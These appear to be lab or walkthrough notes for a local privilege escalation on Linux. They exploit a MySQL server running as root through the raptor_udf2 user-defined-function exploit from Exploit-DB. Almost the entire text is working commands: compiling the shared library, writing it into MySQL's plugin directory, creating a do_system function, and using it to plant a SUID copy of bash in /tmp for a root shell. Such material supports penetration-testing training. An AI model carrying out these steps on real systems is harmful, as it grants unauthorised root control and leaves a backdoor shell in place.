
https://www.exploit-db.com/exploits/1518
`gcc -g -c raptor_udf2.c -fPIC`
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`


mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

`use mysql;`
`create table foo(line blob);`
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
`create function do_system returns integer soname 'raptor_udf2.so';`

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`
